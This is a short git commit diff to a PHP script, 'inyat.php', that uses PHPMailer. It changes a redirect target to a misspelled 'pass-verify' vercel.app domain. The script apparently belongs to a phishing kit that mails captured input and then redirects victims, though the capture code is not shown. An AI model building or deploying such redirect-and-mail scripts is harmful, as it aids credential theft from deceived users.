ae659498e00d01eeb2bd71e9a8fe028e26a976a4
team11203 <155807397+team11203@users.noreply.github.com>
2025-07-22 09:57:10 +0500

    Update inyat.php

--- inyat.php
+++ inyat.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://in-ys.vercel.app/");
+header("Location:https://in-to-pass-verfiy.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
